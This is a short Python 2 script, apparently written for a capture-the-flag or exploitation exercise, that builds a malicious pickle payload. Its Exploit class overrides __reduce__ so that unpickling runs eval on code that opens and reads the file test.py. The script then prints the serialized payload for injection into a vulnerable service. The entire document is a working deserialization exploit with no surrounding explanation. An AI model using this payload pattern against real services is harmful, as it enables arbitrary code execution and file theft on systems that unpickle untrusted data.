from pickle import dumps


class Exploit(object):
    def __reduce__(self):
        return (eval, ('open("test.py").read()',))

print dumps(Exploit())+'#'
